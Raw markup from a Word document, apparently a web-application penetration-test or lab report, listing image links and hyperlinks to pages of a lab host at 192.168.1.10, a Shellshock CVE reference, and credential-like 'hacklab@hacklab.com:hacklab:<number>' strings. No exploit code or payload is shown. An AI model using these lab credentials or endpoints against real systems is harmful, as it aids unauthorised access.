      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1511985531">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1512068802">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1557475356">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1588226839">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1614433074">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1615671019">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1620918477">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1622028456">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1632978267">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1648362227">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1663504409">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1663656205">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1693267285">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1778677138">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1811433582">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1817989872">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1852328875">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1858616479">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1859152306">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1859193016">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1881866570">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1882089486">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1919749761">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1920409410">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1951279201">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1956280580">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1964998480">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1969118255">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1976834725">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2007397820">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2007706341">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2021542180">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2048869913">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2054384249">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2056732270">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2064059592">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2070809985">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2072387528">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2091660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6.png"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Aboruc@gmail.com" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398843947" TargetMode="External"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image79.png"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer2.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/login.php" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:UniqueUser@UniqueUser.com" TargetMode="External"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image90.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image350.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14.png"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398851517" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.png"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.png"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer3.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/addendum.php?type=terms.php" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/logout.php" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/session.php" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398839007" TargetMode="External"/><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hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.png"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image81.png"/><Relationship Id="rId145"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17.png"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.png"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Aboruc@gmail.com" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398839247" TargetMode="External"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398851617" TargetMode="External"/><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71.png"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image76.png"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer4.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/Sign%20In.php" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/cart_update.php?emptycart=1&amp;return_url=aHR0cDovLzE5Mi4xNjguMS4xMC9wcm9kdWN0cy5waHA/Y29tbWFuZCZwcm9kdWN0aWQ" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/products.php" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398838417" TargetMode="External"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><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image" Target="media/image82.png"/><Relationship Id="rId146"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21.png"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image320.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item2.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/alterpassword.php" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image35.png"/><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image" Target="media/image72.png"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398839337" TargetMode="External"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/profile.php?msg=Successfully%20updated%20-%20I%20think" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/index.php" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/products.php?command&amp;productid" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398838597" TargetMode="External"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:tjones@gmail.com" TargetMode="External"/><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7.png"/><Relationship Id="rId147"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22.png"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image330.png"/><Relationship Id="rId98" 